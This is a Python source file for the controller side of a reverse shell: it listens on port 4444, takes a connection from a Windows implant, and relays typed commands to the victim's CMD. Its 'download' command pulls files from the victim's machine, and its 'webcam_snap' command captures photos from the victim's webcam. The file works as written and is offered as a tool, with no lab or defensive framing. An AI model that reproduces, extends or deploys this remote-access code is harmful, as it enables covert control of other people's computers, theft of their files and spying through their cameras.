import socket
import os
import tqdm


class Listening:
    def __init__(self, host, port):
        self.SERVER_HOST = host
        self.SERVER_PORT = port
        self.BUFFER_SIZE = 10240
        # create socket
        self.s = socket.socket()
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.listen(5)
        print(f"[*] Listening as {self.SERVER_HOST}:{self.SERVER_PORT}")
        self.client_socket, client_address = self.s.accept()
        print(f"[+] {client_address[0]}:{client_address[1]} Connect")
        print(self.client_socket.recv(self.BUFFER_SIZE).decode(), end='')
        # Set CMD utf-8
        self.client_socket.send("chcp 65001".encode())

    def download(self, localpath):
        rev = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if rev == "Path doesn't exist!":
            return rev
        elif rev == "0":
            return "Broken file!"
        else:
            file_size = int(rev)
        self.client_socket.send("ok".encode())

        progress = tqdm.tqdm(range(file_size), f"Receiving {localpath}", unit="B", unit_scale=True, unit_divisor=1024)
        left = file_size
        with open(localpath, "wb") as f:
            while True:
                # read 1024 bytes from the socket (receive)
                bytes_read = self.client_socket.recv(self.BUFFER_SIZE)
                if not bytes_read:
                    break
                # write to the file the bytes we just received
                f.write(bytes_read)
                left -= len(bytes_read)
                # update the progress bar
                progress.update(len(bytes_read))
                if left == 0:
                    break
        return "success"

    def run(self):
        while True:
            # get the command from prompt
            command = input("> ")
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            elif command[:8].lower() == "download":
                try:
                    filename, localpath = command[9:].split(" ")
                except:
                    print("Wrong syntax!")
                    continue
                self.client_socket.send("download ".encode() + filename.encode())
                status = self.download(localpath)
                print(status)
                continue
            elif command[:11].lower() == "webcam_snap":
                localpath = command[12:].strip()
                self.client_socket.send(command.encode())
                status = self.download(localpath)
                print(status)
                continue

            # send the command to the client
            self.client_socket.send(command.encode())

            # retrieve command results
            results = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")
            # print them
            print(results, end='')
        # close connection to the client
        self.client_socket.close()
        # close server connection
        self.s.close()

if __name__ == '__main__':
    l = Listening("0.0.0.0", 4444)
    l.run()